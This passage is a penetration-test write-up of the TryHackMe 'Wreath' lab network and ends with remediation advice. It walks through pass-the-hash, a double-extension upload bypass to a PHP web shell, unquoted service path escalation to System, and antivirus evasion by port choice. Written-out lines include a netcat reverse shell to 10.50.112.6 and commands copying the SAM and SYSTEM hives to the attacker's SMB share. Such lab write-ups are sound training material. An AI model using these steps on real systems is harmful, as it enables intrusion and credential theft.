<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 401.50px; height: 127.84px;">![](/_reports/Wreath/image10.png)</span>

### <span>Shell Stabilization</span>

<span>Earlier,</span> <span>we found that port 3389 was open on the .150 system. This is the port typically designated for Remote Desktop Protocol (RDP), and we can use this port to get a nice GUI on the box. First, I created a user with admin privileges inside the</span> <span class="c0">Remote Management Users</span><span class="c1"> group so as to allow us to remotely authenticate as the user through RDP:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 558.81px; height: 136.55px;">![](/_reports/Wreath/image11.png)</span>

<span>We can now use</span> <span class="c0">evil-winrm</span> <span class="c1">with our created credentials to easily get a shell on the box:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 417.78px; height: 126.71px;">![](/_reports/Wreath/image76.png)</span>

#### <span class="c0 c4">Mimikatz</span>

<span>With the user that we created, a nice GUI instance can be established using the</span> <span class="c0">xfreerdp</span> <span class="c1">command as follows:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 536.50px; height: 42.36px;">![](/_reports/Wreath/image31.png)</span>

<span>This results in a GUI instance of the box. I executed</span> <span class="c0">cmd.exe</span><span>as Administrator because the created user is part of the Administrators group. With administrative privileges, it’s possible to extract Windows’ stored credentials (I talk about this in depth in my</span> <span>Bastion Writeup</span><sup>[[7]](#ftnt7)</sup><span>).</span> <span class="c1"> </span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 414.77px; height: 112.53px;">![](/_reports/Wreath/image52.png)</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 299.50px; height: 283.04px;">![](/_reports/Wreath/image59.png)</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 302.50px; height: 43.21px;">![](/_reports/Wreath/image1.png)</span>

<span class="c35 c2">These NTLM Hashes were edited so as to not expose the full hash</span>

##### <span class="c26 c9">How Mimikatz Works</span>

<span>Looking at the output of Mimikatz, we can see</span><span class="c1"> the hashes for all the users on the system. This is due to the single sign-on (SSO) feature of Windows. The SSO feature is used so as to not constantly ask the user to input his username and password whenever he wants to access a resource on the network, as this is simply tedious (once again, the great old war between convenience and security). Instead, the server hashes the user’s password and stores it in the SAM (Security Account Manager) hive. These credentials are then managed by the Local Security Authority (LSASS.exe), essentially enabling SSO.</span>

<span>Copying the output of Mimikatz, I saw that Thomas has an insecure password which hashcat cracked (alternatively, you can use</span> <span class="c52">[https://crackstation.net/](https://www.google.com/url?q=https://crackstation.net//&sa=D&source=editors&ust=1653835189693504&usg=AOvVaw3kQqPfq00fitGF9svAnvVh)</span><sup>[[8]](#ftnt8)</sup><span>). However, the Administrator password was too secure to crack, but it is still possible to use this hash for authenticating as the Administrator user. Evil-winrm has an extremely powerful flag denoted with</span> <span class="c0">-H</span><span class="c1"> which is used to gain access to an account by performing a pass the hash attack (PtH).</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 507.50px; height: 116.08px;">![](/_reports/Wreath/image68.png)</span>

##### <span class="c9 c26">How a Pass the Hash Attack (PtH) Works</span>

<span>As can be seen in the image above, we authenticated as Administrator despite not specifying the password for the user, confirming that PtH worked! This attack works as follows</span><sup>[[9]](#ftnt9)</sup><span class="c1">:</span>

<span class="c1"></span>

<span class="c0 c11">Pentester:</span><span class="c11"> </span><span class="c2">Cool! I just got Administrator’s hash so let’s use evil-winrm to access the powershell.exe resource as Administrator.</span><span class="c1"> “Hey server! Give me powershell.exe as Administrator!”</span>

<span class="c44 c0">Server:</span><span class="c44"> </span><span>“Hi there</span> <span>Pentester</span><span>! I know you want powershell.exe as the Administrator user, but I can’t just give it to you without verifying first that you are in fact the Administrator. I’ll test you by sending you this random 16 byte integer:</span> <span class="c0">65532345234...34324234</span><span class="c1">. Encrypt this with your password hash and send the response back to me.”</span>

<span class="c11 c0">Pentester:</span><span class="c11"> </span><span class="c2">No problem, I’ll encrypt this 16 byte number with Administrator’s hash.</span><span>“Hey</span> <span>Server</span><span>! Here is my encrypted response:</span> <span class="c0">#$()#@$*@!_#)*$./121</span><span class="c1"> (the actual encryption doesn’t really look like this in reality, but I will use this string for the purpose of demonstration).”</span>

<span class="c44 c0">Server:</span><span class="c44"> </span><span>“Alright, thanks for the response</span> <span>Pentester</span><span>. Hi</span> <span>Domain Controller</span><span>! I challenged</span> <span>Pentester</span> <span>with this 16 byte integer:</span> <span class="c0">65532345234...34324234</span><span>, and this was his encrypted response:  </span><span class="c0">#$()#@$*@!_#)*$./121</span><span class="c1">.</span>

<span class="c0 c47">Domain Controller:</span><span class="c47"> </span><span class="c2">Right, well I have</span> <span class="c2">Server’s</span> <span class="c2">challenge and</span> <span class="c2">Pentester’s</span> <span class="c2">response. Let me go check my library of NTLM hashes and see if I can decrypt this response with Administrator’s hash...and I can! This must be Administrator then.</span><span>“Hello</span> <span>Server</span><span class="c1">, I was able to decrypt the response with Administrator’s hash, so this must be Administrator. Grant the client the powershell.exe resource.”</span>

<span class="c44 c0">Server:</span><span class="c44"> </span><span>“Sure thing! Here you go</span> <span>Pentester</span><span class="c1">!”</span>

<span class="c11 c0">Pentester:</span><span class="c11"> </span><span>“Thanks for the shell!”</span>

## <span class="c44 c0 c39 c48">Third Machine (.100)</span>

### <span class="c27 c0">Port Enumeration</span>

<span class="c1">After establishing persistence on the .150 host, the third and final machine is yet to be compromised (the .100 computer). The first thing we should do is enumerate the ports of the machine, just like we did with all the other compromised systems. Instead of trying to manually upload a port scanning script onto the box, we can use evil-winrm by utilizing the -s flag!</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 462.50px; height: 189.76px;">![](/_reports/Wreath/image22.png)</span>

<span>We see that ports 80 and 3389 are open. These most likely correspond to HTTP and RDP respectively. Unfortunately, we cannot access this computer through the .200 proxy because it is only visible by .150\.</span>

### <span>Forward SOCKS Proxy</span>

<span>This means that we will need to create a proxy on the .150 machine. A tool called</span> <span class="c0">chisel</span> <span class="c1">comes in handy for this operation. To set up a forward SOCKS proxy on the .150 machine, we first need to follow a couple of steps:</span>

1.  <span class="c1">The server must be told to disable the firewall on the port we want to use for the forward proxy (I will use port 30001):</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 40.00px;">![](/_reports/Wreath/image6.png)</span>

1.  <span class="c1">The server should then be told to listen on port 30001 for inbound connections:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 20.00px;">![](/_reports/Wreath/image18.png)</span>

1.  <span>Next, on the attacking box we want to connect to the listening port, and forward all data to a proxy sitting on 30002:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 466.50px; height: 71.77px;">![](/_reports/Wreath/image71.png)</span>

1.  <span class="c1">We then configure the web browser extension FoxyProxy to connect to this proxy:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 618.07px; height: 142.05px;">![](/_reports/Wreath/image8.png)</span>

1.  <span>Finally, we can visit the website sitting on</span> <span class="c0">.100</span><span class="c1">:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 315.77px; height: 252.21px;">![](/_reports/Wreath/image73.png)</span>

### <span class="c0 c27">Examining the Web Server</span>

<span class="c1">Along with FoxyProxy, Wappalyzer is also a very useful browser extension which displays useful information about how a website is built. Running this extension on Thomas’s personal website, we see the following:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 250.50px; height: 214.87px;">![](/_reports/Wreath/image36.png)</span>

#### <span class="c4 c0">Analysing the Website’s Code</span>

<span>This website looks identical to the one on the</span> <span class="c0">.200</span><span>host. Thomas told us that he is “serving a website that's pushed to my git server”. The</span> <span class="c0">.150</span><span class="c1"> machine has a git server and this is most likely what he was referring to, so I downloaded the source code of his website.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 423.50px; height: 32.92px;">![](/_reports/Wreath/image75.png)</span>

<span>Using the extractor tool from</span> <span>GitTools</span><sup>[[10]](#ftnt10)</sup><span>, I iterated through the commits of the git repository.</span><span class="c1"> Unfortunately, this tool does not list the commits by date, but this can be done manually by looking at the parent of each commit:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 406.50px; height: 321.57px;">![](/_reports/Wreath/image74.png)</span>

<span class="c1">We see that the commit starting with 70dd does not have a parent, so this must be the oldest commit. The parent of 82df is 70dd, and the parent of 345a is 82df. This means that from youngest to oldest the commits are as follows:</span>

1.  <span class="c1">345a</span>
2.  <span class="c1">82df</span>
3.  <span class="c1">70dd</span>

<span>We can examine the code from the most recent commit. Seeing as Wappanalyzer identified Thomas’s webpage as being run in PHP, it follows that there should likely be an</span> <span class="c0">index.php</span><span class="c1"> file.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 519.50px; height: 59.94px;">![](/_reports/Wreath/image54.png)</span>

<span>Taking a look at the file, there seems to be an upload feature that redirects uploaded files to a directory called</span> <span class="c0">uploads/</span><span>..</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 590.41px; height: 118.50px;">![](/_reports/Wreath/image62.png)</span>

<span>The filter checks if a file is an image based on its size and if a file ends with a valid extension. We can see that the allowed extensions are</span> <span class="c0">jpg, jpeg, png,</span> <span>and</span><span class="c0"> gif</span><span class="c1">, so I examined how the webpage identifies the extension:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 582.87px; height: 85.07px;">![](/_reports/Wreath/image60.png)</span>

<span>The explode function splits a string into an array based on a specified parameter. In the code, it is set to split based on the period character and grabs the string at index one (note that this is the second element in the array, as the first element is at index zero). It then compares this string with one of the allowed extensions. The problem with this is that upon uploading a file called</span> <span class="c0">reverse-shell.jpg.php</span><span class="c1">, the code will split the file as follows:</span>

<span class="c15 c0">[‘reverse-shell’,’jpg’,’php’]</span>

<span>Then, the string in the first index (jpg) will be compared. Thus, we have bypassed the first filter. The second filter (i.e. the image size check) can also be bypassed</span><sup>[[11]](#ftnt11)</sup><span class="c1">. We can add a comment to an image with malicious php code, and if the server executes our image as php, then our malicious code will work as a web shell.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 538.50px; height: 71.68px;">![](/_reports/Wreath/image56.png)</span>

<span>A basic HTTP authentication is required to access the</span> <span class="c0">/resources</span><span>directory, but we cracked Thomas’s hash</span> <span class="c52">[before](#h.wzvkxqwdhgz4)</span><span class="c1">, so it is likely that Thomas reused this password for authentication to his web server. We can guess that the username is Thomas, or other variations of his name, and we get into the upload page (it turns out that the username was indeed Thomas).</span>

### <span class="c27 c0">Reverse Shell</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 227.44px; height: 113.20px;">![](/_reports/Wreath/image3.png)</span>

<span>I then uploaded the malicious image file (</span><span class="c0">0xd4y-image.jpg.php</span><span class="c1">):</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 224.50px; height: 110.82px;">![](/_reports/Wreath/image51.png)</span>

<span>Visiting the uploaded script on</span> <span class="c0">resources/uploads/0xd4y-image.jpg.php</span><span>reveals that it got successfully uploaded. To test if the image successfully is getting executed as php, I gave the command of</span> <span class="c0">whoami</span><span class="c1"> to the parameter cmd.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 507.50px; height: 100.00px;">![](/_reports/Wreath/image63.png)</span>

<span>And the php web shell works! The next step is to get a reverse shell. After identifying the target as a 64 bit machine by using</span> <span class="c0">systeminfo</span><span>, I uploaded a 64bit netcat binary</span><sup>[[12]](#ftnt12)</sup><span> </span><span>and called it</span> <span class="c0">0xd4y-nc.exe</span><span>. I then set up an HTTP server on my local box with python and downloaded the binary onto the system with curl. To get a reverse shell, I used a simple nc reverse shell payload:</span> <span class="c0">powershell.exe%20C:\xampp\htdocs\resources\uploads\0xd4y-nc.exe%2010.50.112.6%20443%20-e%20cmd.exe</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 349.54px; height: 120.50px;">![](/_reports/Wreath/image30.png)</span>

<span class="c35 c2">Note how I used port 443 for the reverse shell, as this port tends to be treated as unsuspicious by AV. In contrast, using port 1337 or port 9001 seems very suspicious (but in this case it works anyways).</span>

### <span class="c27 c0">Privilege Escalation to System</span>

#### <span class="c4 c0">Searching for Misconfigurations</span>

<span>Enumerating the privileges of our compromised user, we don’t see anything too out of the ordinary.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 353.54px; height: 301.58px;">![](/_reports/Wreath/image72.png)</span>

<span>However, this user does have the</span> <span class="c0">SeImpersonatePrivilege</span><span>which could potentially be vulnerable to exploits such as</span> <span>Juicy Potato</span><sup>[[13]](#ftnt13)</sup><span> (</span><span class="c2">note that even though this is a 2019 Windows system rather than 2016, there have been some exploitations of this privilege in later versions</span><sup class="c2">[[14]](#ftnt14)</sup><span>).</span> <span class="c1"> </span>

<span class="c1">I ignored this potential privilege escalation vector due to its greater complexity, and I enumerated the services for a potential vulnerability to an unquoted service path attack.</span>

#### <span class="c4 c0">Unquoted Service Path Attack</span>

<span>It’s likely that the default Windows paths will not be vulnerable to this sort of attack, so I focused on services that were not in</span> <span class="c0">C:\Windows</span><span class="c1">.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 578.50px; height: 41.39px;">![](/_reports/Wreath/image67.png)</span>

<span>As it turned out, there was a service that contained an unquoted path called</span> <span class="c0">SystemExplorerHelpService</span><span class="c1">.</span>

##### <span class="c26 c9">How an Unquoted Service Path Attack Works</span>

<span>Due to there not being quotes around the path to this service, Windows does not know where to execute the desired binary. Seeing as the path for this vulnerable service is</span> <span class="c0">C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe</span><span>, Windows will check for a binary in the following order</span><sup>[[15]](#ftnt15)</sup><span class="c1">:</span>

1.  <span class="c1">C:\Program.exe</span>
2.  <span class="c1">C:\Program Files (x86)\System.exe</span>
3.  <span class="c1">C:\Program Files (x86)\System Explorer\System.exe</span>
4.  <span class="c1">C:\Program Files (x86)\System Explorer\System Explorer\service.exe</span>
5.  <span class="c1">C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe</span>

<span>It is highly unlikely that the compromised user has write access to</span> <span class="c0">C:\Program Files(x86)</span><span>, but it is probable that the user can write to</span> <span class="c0">C:\Program Files(x86)\System Explorer</span><span class="c1">. Therefore, we can create a malicious binary called System.exe in the appropriate path, and it will get executed.</span>

##### <span class="c26 c9">Creating a Malicious Binary</span>

<span class="c1">Checking to see if this service is running as System revealed that it is!</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 474.41px; height: 168.02px;">![](/_reports/Wreath/image24.png)</span>

<span>This seemed like a good vector for privilege escalation, however, I understood that I would be lucky if the compromised user had permissions to edit this service.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 529.50px; height: 265.76px;">![](/_reports/Wreath/image4.png)</span>

<span>Seeing as we are part of the BUILTIN\Users group, we have FullControl to this service! The System Explorer executable can therefore be replaced by whatever we would like. I created a program in C# called</span> <span class="c0">malicious.cs</span><span class="c1"> that returns a reverse shell.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 523.50px; height: 210.57px;">![](/_reports/Wreath/image78.png)</span>

<span class="c1">Following the creation of the script, I compiled this program with mcs, a C# compiler:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 371.50px; height: 99.18px;">![](/_reports/Wreath/image26.png)</span>

<span>After compiling the program, I renamed</span> <span class="c0">malicious.exe</span><span>to</span> <span class="c0">System.exe</span><span>. Seeing as System is running the service we are trying to hijack, it follows that we should get a reverse shell as System when restarting the service. After downloading the binary to the target, I copied it over to the</span> <span class="c0">C:\Program Files (x86)\System Explorer\</span><span class="c1"> directory.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 405.50px; height: 167.01px;">![](/_reports/Wreath/image19.png)</span>

<span class="c1">With the malicious binary in place, I set up a netcat listener on port 443 (as specified in the C# code) before restarting the service:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 394.50px; height: 185.30px;">![](/_reports/Wreath/image57.png)</span>

<span>Typing</span> <span class="c0">sc stop SystemExplorerHelpService</span><span>(to stop the service) and</span> <span class="c0">sc start SystemExplorerHelpService</span><span> (to start the service) resulted in a reverse shell as System:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 348.50px; height: 132.60px;">![](/_reports/Wreath/image2.png)</span>

### <span class="c27 c0">Data Exfiltration</span>

<span>Now, with a reverse shell as System, we can extract the stored credentials on this system.</span> <span>Mimikatz cannot be used as Antivirus is installed on this machine. However, because we are System, we can copy the</span> <span class="c0">SAM</span> <span>and</span> <span class="c0">SYSTEM</span> <span>files and locally extract the stored hashes. I set up an SMB server on my machine to download the files with</span> <span class="c0">sudo impacket-smbserver share . -smb2support -username 0xd4y -password pass</span><span class="c1"> and transferred the SAM and SYSTEM hives as follows:</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 520.03px; height: 42.00px;">![](/_reports/Wreath/image61.png)</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 521.50px; height: 228.03px;">![](/_reports/Wreath/image55.png)</span>

<span class="c35 c2">Note that we received the NTLMV2 hash of our created SMB user. Cracking this hash reveals that the password of 0xd4y is pass.</span>

<span>On the reverse shell, I typed</span> <span class="c0">copy HKLM\SYSTEM \\10.50.112.6\share\SYSTEM</span><span class="c1">, and</span>

<span class="c0">copy HKLM\SAM \\10.50.112.6\share\SAM</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 420.50px; height: 38.50px;">![](/_reports/Wreath/image42.png)</span>

<span>Now with the sensitive SAM and SYSTEM hives on my local system, I was able to extract all hashes using the</span> <span class="c0">impacket-secretsdump</span><span> tool.</span>

<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 399.51px; height: 158.02px;">![](/_reports/Wreath/image69.png)</span>

# <span class="c30 c11 c0">Cleanup</span>

<span>After fully compromising the Wreath Network, I deleted all the binaries that I downloaded (namely</span> <span class="c0">0xd4y-socat</span><span>,</span> <span class="c0">0xd4y-nc.exe</span><span>,</span> <span class="c0">System.exe</span><span>, and</span> <span class="c0">exploit-0xd4y.php</span><span class="c1">). Though the removal of these binaries allowed for a stealthier compromise, the attacks conducted in this report were not meant to be particularly stealthy. Many binaries used were not obfuscated, and file transfers were conducted over SMB and HTTP rather than HTTPS.</span>

# <span class="c30 c11 c0"></span>

# <span class="c30 c11 c0"></span>

# <span class="c30 c11 c0"></span>

# <span class="c30 c11 c0"></span>

# <span class="c30 c11 c0"></span>

# <span class="c11 c0 c30"></span>

# <span class="c30 c11 c0"></span>

<span class="c1"></span>

<span class="c1"></span>

<span class="c1"></span>

# <span class="c30 c11 c0">Conclusion</span>

<span class="c1">The attack surface of a web server is much bigger than most other services. It is essential to be wary of which services are running as a privileged user. There was no need for local privilege escalation in two out of three compromised machines during this penetration test. If possible, it should be refrained from using root to run services unless it is absolutely necessary. This will cause a greater difficulty for an attacker to attain root access on a system, and will greatly mitigate the potential damage in case of a breach.</span>

<span class="c1">The client had multiple critical vulnerabilities in his network. The specific remediations for patching the vulnerabilities outlined in this report are as follows:</span>

*   <span class="c1">Install the latest software for all running services, even if a system is only running on an internal network with no outside internet access</span>

*   <span class="c1">The first and second compromised machines had old software with critical vulnerabilities which can be easily patched by updating the software</span>

*   <span class="c1">Refrain from using root to run any services unless it is absolutely necessary</span>

*   <span class="c1">This note is especially true for web servers as they have a large attack surface. It is recommend to create a low-privileged user specifically for the purpose of running a web service</span>

*   <span class="c1">Never reuse passwords</span>

*   <span class="c1">A cracked password from the second compromised machine was reused for accessing a webpage on the third machine</span>

*   <span class="c1">Be mindful of potential misconfigurations.</span>

*   <span class="c1">The privilege escalation on the client’s personal computer was possible due to a misconfiguration of a service running as System</span>
*   <span class="c1">The compromised low-privileged user was able to configure services despite not being part of the Administrators group</span>

*   <span class="c1">Filters in code should be meticulously analyzed</span>

*   <span class="c1">Code for uploading files on the website of the third machine did not successfully filter potentially malicious files</span>

<span>The goals of this penetration test were met. As requested by the client, I was able to successfully compromise the Wreath network with root access on all three systems. The client is highly encouraged to patch his systems with the aforementioned remediations as soon as possible.</span>

<div>

<span class="c1"></span>

</div>

* * *

<div>

[[1]](#ftnt_ref1)<span class="c35"> </span><span class="c21">[https://tryhackme.com/room/wreath](https://www.google.com/url?q=https://tryhackme.com/room/wreath&sa=D&source=editors&ust=1653835189710334&usg=AOvVaw1qAwluBX80aAagaFNEWYLs)</span><span class="c23"> </span>

</div>

<div>

[[2]](#ftnt_ref2)<span class="c35"> </span><span class="c21">[https://httpd.apache.org/docs/2.4/vhosts/details.html](https://www.google.com/url?q=https://httpd.apache.org/docs/2.4/vhosts/details.html&sa=D&source=editors&ust=1653835189711518&usg=AOvVaw1c8Eons6V56vd0MkGXq2oE)</span><span class="c23"> </span>

</div>

<div>

[[3]](#ftnt_ref3)<span class="c35"> </span><span class="c21">[https://nvd.nist.gov/vuln/detail/CVE-2019-15107](https://www.google.com/url?q=https://nvd.nist.gov/vuln/detail/CVE-2019-15107&sa=D&source=editors&ust=1653835189707271&usg=AOvVaw3PC9puWvunmz0lnM99933V)</span><span class="c23">   </span>

</div>

<div>

[[4]](#ftnt_ref4)<span class="c35"> </span><span class="c21">[https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap](https://www.google.com/url?q=https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap&sa=D&source=editors&ust=1653835189707693&usg=AOvVaw3nDUcLgSBrw7BnPyLTurCP)</span><span class="c23"> </span>

</div>

<div>

[[5]](#ftnt_ref5)<span class="c35"> </span><span class="c21">[https://owasp.org/www-chapter-ghana/assets/slides/OWASP_Gitstack_Presentation.pdf](https://www.google.com/url?q=https://owasp.org/www-chapter-ghana/assets/slides/OWASP_Gitstack_Presentation.pdf&sa=D&source=editors&ust=1653835189707998&usg=AOvVaw2DLF6WLq9nQM6_XGgcg5rH)</span><span class="c23"> </span>

</div>

<div>

[[6]](#ftnt_ref6)<span class="c35"> </span><span class="c21">[https://github.com/samratashok/nishang](https://www.google.com/url?q=https://github.com/samratashok/nishang&sa=D&source=editors&ust=1653835189710599&usg=AOvVaw1Net_GxjvlIyEUHQMCa47o)</span><span class="c23"> </span>

</div>

<div>

[[7]](#ftnt_ref7)<span class="c35"> </span><span class="c21">[https://0xd4y.github.io/Writeups/HackTheBox/Bastion%20Writeup.pdf](https://www.google.com/url?q=https://0xd4y.github.io/Writeups/HackTheBox/Bastion%2520Writeup.pdf&sa=D&source=editors&ust=1653835189708291&usg=AOvVaw0wR0ILdBaZ-7EZ8awc4NVz)</span><span class="c23"> </span>

</div>

<div>

[[8]](#ftnt_ref8)<span class="c23"> This website can be particularly fast in cracking unsalted hashes because it uses a rainbow table.</span>

</div>

<div>

[[9]](#ftnt_ref9)<span class="c35"> </span><span class="c21">[https://www.youtube.com/watch?v=cBXdoIuLzmA&ab_channel=1ENews](https://www.google.com/url?q=https://www.youtube.com/watch?v%3DcBXdoIuLzmA%26ab_channel%3D1ENews&sa=D&source=editors&ust=1653835189710886&usg=AOvVaw2dDk4aNL1PRHcWQeG4tTDQ)</span><span class="c23"> </span>

</div>

<div>

[[10]](#ftnt_ref10)<span class="c35"> </span><span class="c21">[https://github.com/internetwache/GitTools](https://www.google.com/url?q=https://github.com/internetwache/GitTools&sa=D&source=editors&ust=1653835189708658&usg=AOvVaw1i1sK-eY0ED8kpPC-MuUjF)</span><span class="c23"> </span>

</div>

<div>

[[11]](#ftnt_ref11)<span class="c35"> </span><span class="c21">[https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass](https://www.google.com/url?q=https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass&sa=D&source=editors&ust=1653835189711215&usg=AOvVaw1Bve2moS9CXtFLQDNMWP-D)</span><span class="c23"> </span>

</div>

<div>

[[12]](#ftnt_ref12)<span class="c35"> </span><span class="c21">[https://github.com/int0x33/nc.exe/](https://www.google.com/url?q=https://github.com/int0x33/nc.exe/&sa=D&source=editors&ust=1653835189708930&usg=AOvVaw1czA9aL0V5yCMy3Vfu6pKD)</span><span class="c23"> </span>

</div>

<div>

[[13]](#ftnt_ref13)<span class="c35"> </span><span class="c21">[https://github.com/ohpe/juicy-potato](https://www.google.com/url?q=https://github.com/ohpe/juicy-potato&sa=D&source=editors&ust=1653835189709646&usg=AOvVaw2qzAuKL43AnKXXXZlDEDB8)</span><span class="c23"> </span>

</div>

<div>

[[14]](#ftnt_ref14)<span class="c35"> </span><span class="c21">[https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://www.google.com/url?q=https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/&sa=D&source=editors&ust=1653835189709932&usg=AOvVaw1v_bLSBzajM7YjgZicAD35)</span><span class="c23"> </span>

</div>

<div>

